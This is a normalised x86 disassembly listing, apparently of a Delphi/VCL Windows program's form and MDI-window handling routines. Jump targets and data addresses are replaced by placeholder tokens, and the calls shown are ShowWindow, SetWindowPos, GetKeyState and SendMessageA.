mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
mov cl 0x1
mov eax ebx
call sub_459adc
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0xc ]
xor ecx ecx
mov eax ebx
call sub_459adc
sub_462d78
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x150 ] 0x1
jne r-xdata
cmp [ esi + 0x150 ] 0x0
jne r-xdata
cmp [ esi + 0x158 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
cmp [ esi + 0x154 ] 0x0
je r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x1
sub_462db0
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x150 ] 0x1
jne r-xdata
mov [ edx ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x154 ]
call sub_40403c
mov [ edx ] 0x1
mov eax [ ebx + 0x158 ]
mov [ ecx ] eax
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_462de4
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_462f35
push [ fs : eax ]
mov [ fs : eax ] esp
test [ esi + 0x1c ] 0x10
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462f3c
lea eax [ ebp - 0x10 ]
call sub_403fe8
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov [ ebp - 0x9 ] 0x1
push ebp
mov eax [ esi + 0x248 ]
call sub_462d38
pop ecx
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ eax + 0xc ]
call sub_443644
mov ebx eax
jmp r-xdata
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_416eec
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax esi
call sub_44627c
lea eax [ ebp - 0x1c ]
call sub_406c0c
mov [ ebp - 0x14 ] eax
push ebp
mov eax [ esi + 0x7c ]
call sub_462d38
pop ecx
mov [ ebp - 0x8 ] eax
test ebx ebx
je r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_462d78
test al al
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_467448
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov edx 0xd
mov eax [ rw-data ]
call sub_4674b0
mov ecx [ ebp - 0x8 ]
mov edx 0x8
mov eax [ rw-data ]
call sub_4674b0
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x9 ]
mov eax ebx
call sub_462db0
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_416eec
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax ebx
call sub_44627c
lea eax [ ebp - 0x1c ]
call sub_406c0c
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov ebx [ ebx + 0x30 ]
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_4673e0
test [ esi + 0x228 ] 0x8
je r-xdata
sub_462f44
push ebx
push esi
push ecx
mov [ esp ] edx
mov esi eax
test [ esi + 0x1c ] 0x2
jne r-xdata
mov edx [ esp ]
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edx
pop esi
pop ebx
retn
cmp [ esi + 0x22a ] 0x0
je r-xdata
mov edx [ esp ]
mov edx [ edx + 0x8 ]
mov eax [ esi + 0x74 ]
lea ecx [ edx + 0x18 ]
mov ebx [ eax + 0x14 ]
test ebx ebx
jbe r-xdata
mov ebx [ eax + 0x10 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea ecx [ edx + 0x20 ]
mov ebx [ eax + 0xc ]
test ebx ebx
jbe r-xdata
mov [ ecx + 0x4 ] ebx
mov ebx [ eax + 0x8 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea eax [ edx + 0x20 ]
push eax
lea eax [ edx + 0x24 ]
push eax
lea ecx [ edx + 0x1c ]
lea eax [ edx + 0x18 ]
mov edx eax
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov [ ecx + 0x4 ] ebx
sub_462fb8
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx ]
add eax ecx
sub eax esi
cdq
xor eax edx
sub eax edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x2e4 ]
jge r-xdata
pop esi
pop ebx
pop ebp
retn
sub esi ecx
mov [ ebx ] esi
sub_462fe4
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x2e2 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44b5f0
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov esi [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_460ff4
lea edx [ ebp - 0x14 ]
call sub_4647bc
push ebp
mov eax [ ebp - 0x4 ]
call sub_460ff4
lea edx [ ebp - 0x24 ]
call sub_4647bc
mov ecx [ ebp - 0x24 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0x14 ]
call sub_462fb8
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
call sub_460ff4
lea edx [ ebp - 0x24 ]
call sub_4647bc
mov ecx [ ebp - 0x20 ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x10 ]
call sub_462fb8
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_462fb8
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4c ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x8 ]
call sub_462fb8
pop ecx
cmp [ eax + 0xc ] 0x0
je r-xdata
sub_46309c
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
or [ ebx + 0x2f4 ] 0x20
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_40346c
pop esi
pop ebx
retn
sub_4630c0
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
and [ ebx + 0x2f4 ] 0xdf
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb1
call sub_40346c
pop esi
pop ebx
retn
sub_4630e4
push ebx
push esi
mov esi edx
mov ebx eax
push 0x12
call GetKeyState
test ax ax
jl r-xdata
mov edx esi
mov eax ebx
call sub_44c4d0
mov ax [ esi + 0x4 ]
sub ax 0x9
je r-xdata
push 0x11
call GetKeyState
test ax ax
jl r-xdata
add eax 0xffffffe4
sub ax 0x4
jb r-xdata
push 0x1
push 0x10
call GetKeyState
test ax ax
setge cl
mov edx [ ebx + 0x220 ]
mov eax ebx
call sub_44d588
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
mov dx [ esi + 0x4 ]
cmp dx 0x27
je r-xdata
mov cl 0x1
cmp dx 0x28
je r-xdata
xor ecx ecx
jmp r-xdata
mov edx [ eax + 0x30 ]
xchg edx eax
call sub_44d588
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_463180
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4636ea
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
call sub_467894
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x4
xor edx edx
push ebp
push sub_4636cd
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4636d4
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405d6c
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_403a24
xor eax eax
push ebp
push sub_4635d4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffaf
call sub_40346c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
push ebp
push j_sub_403738#7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_40346c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_46232c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44a5ac
jmp r-xdata
mov eax [ rw-data ]
call sub_464a18
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_446168
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_44d054
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_44d054
push eax
call SetWindowPos
jmp r-xdata
mov eax [ rw-data ]
call sub_464a0c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4461ac
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44d054
push eax
call IsIconic
test eax eax
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_44d054
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_44d054
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_44d054
call sub_45de98
mov ebx eax
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44d054
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_464a48
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_446168
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_464a18
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44d054
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_44d054
push eax
push DefMDIChildProcA
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_4469c4
push 0x0
mov eax [ ebp - 0x4 ]
call sub_44d054
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_44d054
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_464a3c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4461ac
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_464a0c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_4615dc
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_4615dc
jmp r-xdata
sub_46323d
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_466fa8
call sub_403aa0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ rw-data ]
call sub_464a18
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_446168
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_464a0c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4461ac
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44d054
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_464a48
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_446168
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_464a18
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4636d4
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44d054
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_44d054
push eax
push DefMDIChildProcA
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_4469c4
push 0x0
mov eax [ ebp - 0x4 ]
call sub_44d054
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_44d054
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_464a3c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4461ac
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_464a0c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_4615dc
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_4615dc
jmp r-xdata
sub_4635d9
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_466fa8
call sub_403aa0
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_46232c
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44a5ac
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_44d054
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_44d054
push eax
call SetWindowPos
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4636d4
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44d054
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_44d054
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_44d054
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_44d054
call sub_45de98
mov ebx eax
sub_463720
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
retn
mov eax [ rw-data ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
sub_463778
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
cmp [ esi + 0x59 ] 0x0
je r-xdata
pop esi
pop ecx
pop ebp
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_423744
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4637d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x68 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403270
retn
mov eax [ esi + 0x68 ]
mov edx [ edx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
sub_4637e4
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
mov si 0xffab
call sub_40346c
test al al
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_463810
push ebx
push esi
push ecx
mov ebx eax
test [ ebx + 0x2f4 ] 0x8
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov [ ebx + 0x24c ] 0x2
jmp r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov [ esp ] 0x1
test [ ebx + 0x228 ] 0x2
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov [ esp ] 0x3
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_466f94
jmp r-xdata
mov edx esp
mov eax ebx
mov si 0xffb0
call sub_40346c
cmp [ esp ] 0x0
je r-xdata
cmp [ esp ] 0x3
jne r-xdata
mov eax ebx
call sub_4639b0
jmp r-xdata
mov eax ebx
call sub_463a4c
mov dl 0x1
mov eax ebx
call sub_46159c
jmp r-xdata
sub_4638b4
push ebx
push esi
push edi
push ecx
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x29a ] 0x0
je r-xdata
mov [ esp ] 0x0
mov eax ebx
call sub_460f28
mov esi eax
dec esi
test esi esi
jl r-xdata
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x29c ]
call [ ebx + 0x298 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax ebx
call sub_460f74
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
sub_463918
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_463984
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
mov [ ebp - 0x5 ] 0x1
lea edx [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_40346c
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_463a4c
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4639d0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_463a3e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22e ] 0x0
jne r-xdata
xor eax eax
